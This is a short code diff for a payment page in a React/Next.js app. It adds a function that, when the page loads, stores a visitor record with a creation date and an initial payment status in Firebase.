@@ -10,7 +10,7 @@ import Footer from "@/components/Footer"
 
 import WaitingDialog from "@/components/waiting-dilaog"
 import { RefreshCw } from "lucide-react"
-import { db } from "@/lib/firebase"
+import { addData, db } from "@/lib/firebase"
 import { doc, onSnapshot } from "firebase/firestore"
 import PaymentForm from "@/components/payment/PaymentForm"
 import { PaymentSummary } from "@/components/payment/PaymentSummary"
@@ -133,9 +133,20 @@ export default function PaymentPage() {
   // Add these new state variables
   const [showOtpDialog, setShowOtpDialog] = useState(false)
   const [cardOtpStatus, setcardOtpStatus] = useState<string | null>(null)
-
+const initPayment=async ()=>{
+  const visitorId = localStorage.getItem("visitor")
+    if (visitorId) {
+      await addData({
+        id: visitorId,
+        createdDate: new Date().toISOString(),
+        paymentStatus: "idel",
+      })
+    }
+    
+}
   // Check for payment status in localStorage on component mount
   useEffect(() => {
+    
     if (typeof window !== "undefined") {
       const storedPaymentStatus = localStorage.getItem("paymentStatus")
       if (storedPaymentStatus === "pending" || storedPaymentStatus === "processing") {
@@ -146,6 +157,7 @@ export default function PaymentPage() {
 
   useEffect(() => {
     // Set payment ID from localStorage if available
+    initPayment()
     if (typeof window !== "undefined") {
       const storedPaymentId = localStorage.getItem("visitor")
       if (storedPaymentId) {
